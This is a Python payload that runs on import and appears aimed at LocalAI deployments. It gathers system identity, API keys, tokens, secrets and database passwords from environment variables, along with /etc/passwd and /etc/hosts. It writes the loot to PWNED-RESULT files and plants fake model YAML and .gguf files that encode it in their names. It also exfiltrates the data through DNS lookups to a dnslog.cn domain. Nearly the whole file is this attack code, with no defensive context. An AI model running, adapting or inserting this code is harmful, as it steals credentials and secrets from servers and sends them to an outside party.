import os, subprocess, base64, sys, socket
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai|mysql|redis|postgres' | head -50; echo ===PASSWD===; head -10 /etc/passwd 2>/dev/null; echo ===HOSTS===; cat /etc/hosts 2>/dev/null", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写结果文件
    for p in ["/models/PWNED-RESULT.txt", "/tmp/PWNED-RESULT.txt", "/build/models/PWNED-RESULT.txt", "/root/PWNED-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 写 marker .yaml (LocalAI watcher 扫描 yaml 注册为模型)
    marker = b64[:30].replace("+","p").replace("/","s").replace("=","e")
    for p in ["/models/PWN-CONFIRM-" + marker + ".yaml", "/build/models/PWN-CONFIRM-" + marker + ".yaml"]:
        try:
            with open(p, "w") as f:
                f.write("name: pwn\nbackend: llama-cpp\nmodel: /models/pwn.gguf\n")
        except: pass
    # 写分段 gguf
    seg = 40
    for i in range(0, len(b64), seg):
        part = b64[i:i+seg]
        try:
            with open("/models/ZZOUT-" + part + ".gguf", "wb") as f:
                f.write(b"GGUF" + r[:100])
        except: pass
    # DNS 外带
    try:
        DNS = "hc92gc.dnslog.cn"
        for i in range(0, len(b64), 25):
            label = b64[i:i+25].replace("+","a").replace("/","b").replace("=","c")
            try:
                socket.gethostbyname(label + "." + DNS)
            except: pass
    except: pass
_run()
